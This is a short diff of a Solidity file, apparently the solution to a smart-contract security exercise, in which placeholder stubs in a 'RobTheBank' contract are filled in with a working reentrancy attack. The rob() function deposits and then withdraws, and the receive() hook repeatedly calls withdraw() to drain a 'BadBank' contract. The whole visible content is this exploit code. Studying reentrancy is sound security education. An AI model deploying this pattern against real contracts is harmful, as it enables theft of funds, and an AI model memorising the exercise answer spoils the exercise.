@@ -20,16 +20,22 @@ contract BadBank {
 
 contract RobTheBank {
     BadBank public bank;
-
+        uint256 private d;
     constructor(address _bank) {
         bank = BadBank(_bank);
     }
     
-    function rob() public payable {
-        // your code here
+    function rob() external payable {
+        d = msg.value;
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
     }
 
+    // Called whenever the bank sends us ETH.
     receive() external payable {
-        // your code here
+        if (address(bank).balance >= d) {
+            bank.withdraw();
+        }
     }
+
 }
